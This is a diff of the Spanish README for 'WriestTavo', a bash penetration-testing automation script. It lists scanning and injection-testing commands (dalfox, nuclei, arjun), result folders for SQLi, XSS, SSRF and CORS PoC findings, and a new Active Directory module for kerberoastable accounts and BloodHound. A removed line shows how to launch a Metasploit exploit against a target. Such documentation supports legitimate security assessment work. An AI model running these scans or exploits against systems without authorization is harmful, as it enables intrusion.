-dalfox url "URL?param=value"                         # XSS avanzado
-arjun -u https://target.com/api                      # Params ocultos
-subfinder -d target.com                              # Subdominios
+nuclei -update-templates
+nuclei -l urls.txt -t cves/
+nuclei -u https://target.com -severity critical,high
 ```
 
 ---
@@ -937,59 +1236,67 @@ subfinder -d target.com                              # Subdominios
 ```
 wriestTavo_results/
 ├── nmap/
-│   ├── scan_quick.nmap          # Escaneo inicial de puertos
-│   ├── scan_version.nmap        # Versiones de servicios
-│   └── scan_vuln.xml            # NSE vuln scripts
+│   ├── scan_quick.nmap
+│   ├── scan_version.nmap
+│   └── scan_vuln.xml
 ├── web/
-│   ├── headers_result.txt       # HTTP headers analizados
-│   ├── whatweb_result.txt       # Fingerprinting tecnológico
-│   ├── gobuster_result.txt      # Directorios descubiertos
-│   ├── nikto_result.txt         # Nikto scan
-│   ├── sqli_results.txt         # SQLi findings
-│   ├── xss_results.txt          # XSS findings
-│   ├── lfi_results.txt          # LFI/Path traversal
-│   ├── ssrf_results.txt         # SSRF results
-│   ├── cors_results.txt         # CORS misconfig
-│   ├── cors_poc.html            # PoC de CSRF listo para usar
-│   ├── jwt_analysis.txt         # JWT tokens analizados
-│   ├── nosqli_results.txt       # NoSQLi results
-│   ├── xxe_results.txt          # XXE results
-│   ├── idor_redirect.txt        # IDOR + Open Redirect
-│   ├── iis_windows.txt          # IIS specific tests
-│   ├── http_methods.txt         # Métodos HTTP habilitados
-│   └── js_analysis.txt          # Secrets en JavaScript
+│   ├── headers_result.txt
+│   ├── whatweb_result.txt
+│   ├── gobuster_result.txt
+│   ├── nikto_result.txt
+│   ├── sqli_results.txt
+│   ├── xss_results.txt
+│   ├── lfi_results.txt
+│   ├── ssrf_results.txt
+│   ├── cors_results.txt
+│   ├── cors_poc.html
+│   ├── jwt_analysis.txt
+│   ├── nosqli_results.txt
+│   ├── xxe_results.txt
+│   ├── idor_redirect.txt
+│   ├── iis_windows.txt
+│   ├── http_methods.txt
+│   └── js_analysis.txt
 ├── recon/
-│   ├── crtsh_subdomains.txt     # Subdominios de CT logs
-│   ├── theharvester_result.txt  # OSINT emails/IPs
-│   ├── dnsrecon_result.txt      # DNS records
-│   ├── ssl_result.txt           # SSL/TLS analysis
-│   ├── nuclei_result.txt        # Nuclei findings
-│   ├── framework_scan.txt       # Rutas del framework
-│   ├── infra_exposure.txt       # Docker/K8s/Prometheus
-│   └── exploit_intel.txt        # EDB + NVD results
+│   ├── crtsh_subdomains.txt
+│   ├── theharvester_result.txt
+│   ├── dnsrecon_result.txt
+│   ├── ssl_result.txt
+│   ├── nuclei_result.txt
+│   ├── framework_scan.txt
+│   ├── infra_exposure.txt
+│   └── exploit_intel.txt
 ├── exploits/
-│   └── searchsploit_result.txt  # Exploits del stack
-└── reporte_TARGET_FECHA.html    # ← REPORTE PRINCIPAL
+│   └── searchsploit_result.txt
+├── active_directory/          ← NUEVO v4.1 (ADPulse)
+│   ├── all_users.txt
+│   ├── all_groups.txt
+│   ├── all_computers.txt
+│   ├── kerberoastable.txt
+│   ├── inactive_accounts.txt
+│   ├── gpos.txt
+│   ├── adpulse_log.txt
+│   └── bloodhound/
+│       └── *.zip
+├── reporte_TARGET_FECHA.html          ← Original
+├── reporte_CLIENTE_TARGET_FECHA.html  ← NUEVO v4.1
+├── reporte_CENSURADO_FECHA.html       ← NUEVO v4.1
+└── reporte_PENTESTER_TARGET_FECHA.html ← NUEVO v4.1
 ```
 
 ```
-~/.wriestTavo/                   # Directorio personal del script
+~/.wriestTavo/
 ├── custom_payloads/
-│   ├── sqli_extra.txt           # Tus payloads SQLi
-│   ├── xss_extra.txt            # Tus payloads XSS
-│   ├── lfi_extra.txt            # Tus payloads LFI
-│   ├── ssrf_extra.txt           # Tus payloads SSRF
-│   └── paths_extra.txt          # Tus rutas custom
+│   ├── sqli_extra.txt
+│   ├── xss_extra.txt
+│   ├── lfi_extra.txt
+│   ├── ssrf_extra.txt
+│   └── paths_extra.txt
 ├── modules/
-│   └── modulo_*.sh              # Tus módulos custom
+│   └── modulo_*.sh
 ├── edb_cache/
-│   └── edb_*.json               # Caché EDB (24h)
 ├── cve_cache/
-│   ├── nvd_recent.json          # CVEs últimas 48h
-│   ├── nvd_*.json               # CVEs por tecnología
-│   ├── exploitdb_recent.txt     # Feed EDB reciente
-│   └── stack_cves_*.txt         # CVEs del último scan
-└── last_update.txt              # Fecha de última actualización
+└── last_update.txt
 ```
 
 ---
@@ -997,37 +1304,37 @@ wriestTavo_results/
 ## Preguntas Frecuentes
 
 **¿Por qué no encuentra nada con `--mode stealth`?**
-El modo stealth usa menos puertos y más delay. Para targets con WAF agresivo, algunos módulos se saltan automáticamente. Prueba ejecutar módulos específicos con [11] Custom.
+El modo stealth usa menos puertos y más delay. Para targets con WAF agresivo algunos módulos se saltan. Prueba módulos específicos con [11] Custom.
 
-**¿Puedo correr sin root?**
-El módulo de port scan (`nmap -sS`) requiere root. Los demás módulos web funcionan sin root. Para correr sin sudo: `./wriestTavo.sh --mode normal target.com` (usará `-sT` en vez de `-sS`).
+**¿Puedo correr ADPulse sin credenciales?**
+ADPulse necesita credenciales de solo lectura. Puedes crear una cuenta de dominio con permisos mínimos (Domain Users es suficiente para la mayoría de checks LDAP). El check de Null Bind sí se ejecuta sin credenciales para detectar si el acceso anónimo está habilitado.
 
-**¿searchsploit no encuentra nada?**
-Actualiza la base: `sudo searchsploit --update`. La BD local tiene ~50,000 exploits pero no se actualiza sola.
+**¿Por qué se generan 4 reportes en vez de 1?**
+Porque distintas audiencias necesitan distintos niveles de detalle. El Reporte Censurado es especialmente útil para enviar a directivos o incluir en auditorías de compliance sin exponer la infraestructura interna.
 
 **¿Por qué no se activa sqlmap?**
-sqlmap (módulo 21) **solo** se activa si el módulo 13 (SQLi básico) encontró indicios y estableció `INTEL_SQLI_FOUND=true`. Esto es intencional para evitar falsos positivos y ruido.
+sqlmap (módulo 21) **solo** se activa si el módulo 13 encontró indicios y estableció `INTEL_SQLI_FOUND=true`. Esto evita falsos positivos y ruido.
+
+**¿Cómo aparecen los payloads confirmados en el Reporte Cliente?**
+El módulo que confirma la vulnerabilidad llama a `register_payload()`. Si hay payloads registrados, el Reporte Cliente muestra el badge `✓ INYECCIÓN CONFIRMADA` sobre ese hallazgo y una tabla completa con el payload exacto y URL afectada.
 
 **¿El módulo de SSRF no funciona?**
-SSRF necesita URLs con parámetros. Corre primero gobuster [8] y arjun [24] para descubrir URLs con parámetros que van a `INTEL_INJECTABLE_URLS[]`. Luego corre SSRF [32].
-
-**¿Cómo sé si el cors_poc.html funciona?**
-Abre el archivo `wriestTavo_results/web/cors_poc.html` en un navegador mientras estás autenticado en el target. Si la respuesta incluye datos privados, el CORS es explotable.
-
-**¿Puedo agregar módulos de Metasploit?**
-No directamente, pero puedes crear un módulo custom que llame a `msfconsole -x "use exploit/...; set RHOSTS ${TARGET}; run"`.
-
-**¿El script modifica el target?**
-Los módulos de exploits (sqlmap, commix, dalfox) solo hacen peticiones de prueba, no modifican datos. La excepción es el test de HTTP PUT en módulo 37, que intenta subir y luego eliminar un archivo de prueba.
+SSRF necesita URLs con parámetros. Corre primero gobuster [8] y arjun [24] para poblar `INTEL_INJECTABLE_URLS[]`. Luego SSRF [32].
 
 **¿Cuánto tarda un Full Scan?**
-Depende del target. Estimaciones:
 - IP local sin servicios web: ~10 min
 - Dominio web completo: ~45-90 min
 - WordPress con plugins: ~60-120 min
+- Con ADPulse en red corporativa: +10-20 min extra
 - Con `--mode stealth`: el doble de tiempo
+
+**¿Puedo usar los reportes directamente con clientes?**
+El Reporte Censurado está diseñado para eso. Revisa que no haya información sensible antes de enviarlo — los filtros automáticos son buenos pero no perfectos (pueden quedar paths o datos en tablas HTML del detail).
+
+**¿El script modifica el AD o el target?**
+No. ADPulse usa LDAP de solo lectura y no crea, modifica ni elimina ningún objeto. Los módulos web hacen solo peticiones de prueba. La excepción es el test HTTP PUT del módulo 37, que intenta subir y luego eliminar un archivo de prueba.
 
 ---
 
-*WriestTavo v4.0 — 5511 líneas · 44 módulos · 52 variables INTEL · 134 hallazgos posibles*
-*Última actualización del script: ver banner al ejecutar*
+*WriestTavo v4.1 — 9261 líneas · 45 módulos · 84 variables INTEL · 173 hallazgos posibles · 4 tipos de reporte · 35 checks AD*
+*Última actualización: ver banner al ejecutar*
